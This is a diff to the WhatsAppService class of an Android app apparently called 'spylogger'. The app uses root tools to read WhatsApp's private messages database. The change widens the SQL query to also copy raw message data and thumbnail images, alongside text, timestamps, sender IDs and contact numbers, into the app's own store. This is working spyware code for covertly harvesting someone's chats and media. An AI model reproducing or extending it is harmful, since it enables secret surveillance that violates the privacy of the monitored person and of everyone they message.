@@ -19,6 +19,7 @@ import com.gravatasufoca.spylogger.model.whatsapp.Messages;
 import com.gravatasufoca.spylogger.utils.Utils;
 import com.j256.ormlite.dao.Dao;
 import com.j256.ormlite.dao.GenericRawResults;
+import com.j256.ormlite.field.DataType;
 import com.j256.ormlite.stmt.QueryBuilder;
 import com.stericson.RootTools.RootTools;
 import com.stericson.RootTools.execution.CommandCapture;
@@ -174,13 +175,20 @@ public class WhatsAppService extends Service {
 
     private void updateMsgs(List<Topico> topicos){
         try {
-            GenericRawResults<String[]> rawResults = this.daoMsgExternal.queryRaw("select _id,key_remote_jid,key_from_me,data,timestamp,media_wa_type,media_size,remote_resource,received_timestamp, case when raw_data is not null  then 1 else '' end,media_mime_type from messages where key_remote_jid!='-1' and _id not in( select idReferencia from localdb.mensagem ) ");
+
+            GenericRawResults<Object[]> rawResults = this.daoMsgExternal
+                    .queryRaw("select _id,key_remote_jid,key_from_me,data,timestamp,media_wa_type,media_size,remote_resource,received_timestamp, case when raw_data is not null  then 1 else '' end,media_mime_type,raw_data,thumb_image from messages where key_remote_jid!='-1' and _id not in( select idReferencia from localdb.mensagem ) "
+                            , new DataType[]{DataType.INTEGER,DataType.STRING,DataType.INTEGER,DataType.STRING,DataType.DATE_LONG,DataType.STRING,DataType.STRING,DataType.STRING,DataType.DATE_LONG,DataType.INTEGER,DataType.STRING,DataType.BYTE_ARRAY,DataType.BYTE_ARRAY});
+
+
+//            GenericRawResults<String[]> rawResults = this.daoMsgExternal
+//                    .queryRaw("select _id,key_remote_jid,key_from_me,data,timestamp,media_wa_type,media_size,remote_resource,received_timestamp, case when raw_data is not null  then 1 else '' end,media_mime_type from messages where key_remote_jid!='-1' and _id not in( select idReferencia from localdb.mensagem ) ");
             List<Mensagem> mensagens = new ArrayList<>();
-            Iterator<String[]> iterator = rawResults.iterator();
+            Iterator<Object[]> iterator = rawResults.iterator();
             int contador = 0;
 
             while (iterator.hasNext()) {
-                String[] resultRaw;
+                Object[] resultRaw;
                 try {
                     resultRaw = iterator.next();
                 } catch (Exception e) {
@@ -206,31 +214,33 @@ public class WhatsAppService extends Service {
                     continue;
                 }
                 Mensagem mensagem = new Mensagem.MensagemBuilder()
-                        .setIdReferencia(resultRaw[0])
+                        .setIdReferencia(Integer.toString((Integer) resultRaw[0]))
                         .setRemetente("1".equals(resultRaw[2]))
-                        .setTexto(resultRaw[3])
-                        .setData(new Date(Long.parseLong(resultRaw[4])))
-                        .setDataRecebida(new Date(Long.parseLong(resultRaw[8])))
-                        .setTamanhoArquivo(Long.parseLong(resultRaw[6]))
-                        .setTipoMidia(TipoMidia.getTipoMidia(resultRaw[5]))
-                        .setMediaMime(resultRaw[10])
+                        .setTexto((String) resultRaw[3])
+                        .setData((Date) resultRaw[4])
+                        .setDataRecebida((Date) resultRaw[8])
+                        .setTamanhoArquivo(Long.parseLong((String) resultRaw[6]))
+                        .setTipoMidia(TipoMidia.getTipoMidia((String) resultRaw[5]))
+                        .setMediaMime((String) resultRaw[10])
 //						.setContato(Utils.getContactDisplayNameByNumber(resultRaw[7],getContentResolver()))
-                        .setContato(resultRaw[7] != null ? resultRaw[7] : resultRaw[1])
+                        .setContato((String) (resultRaw[7] != null ? resultRaw[7] : resultRaw[1]))
                         .setTopico(tmpTopico)
                         .setTemMedia("1".equals(resultRaw[9])).build();
+                mensagem.setRaw_data(resultRaw[11]!=null? (byte[]) resultRaw[11]:null);
+                mensagem.setThumb_image(resultRaw[12]!=null? (byte[]) resultRaw[12]:null);
 
                 if(!mensagem.isRemetente()) {
-                    if (resultRaw[7] != null && !resultRaw[7].isEmpty()) {
-                        if (resultRaw[7].indexOf("@") != -1) {
-                            mensagem.setNumeroContato(resultRaw[7].substring(0, resultRaw[7].indexOf("@")));
+                    if (resultRaw[7] != null && !((String)resultRaw[7]).isEmpty()) {
+                        if (((String)resultRaw[7]).indexOf("@") != -1) {
+                            mensagem.setNumeroContato(((String)resultRaw[7]).substring(0, ((String)resultRaw[7]).indexOf("@")));
                         } else {
-                            mensagem.setNumeroContato(resultRaw[7]);
+                            mensagem.setNumeroContato(((String)resultRaw[7]));
                         }
                     } else {
-                        if (resultRaw[1].indexOf("@") != -1) {
-                            mensagem.setNumeroContato(resultRaw[1].substring(0, resultRaw[1].indexOf("@")));
+                        if (((String)resultRaw[1]).indexOf("@") != -1) {
+                            mensagem.setNumeroContato(((String)resultRaw[1]).substring(0, ((String)resultRaw[1]).indexOf("@")));
                         } else {
-                            mensagem.setNumeroContato(resultRaw[1]);
+                            mensagem.setNumeroContato(((String)resultRaw[1]));
                         }
                     }
                 }else{
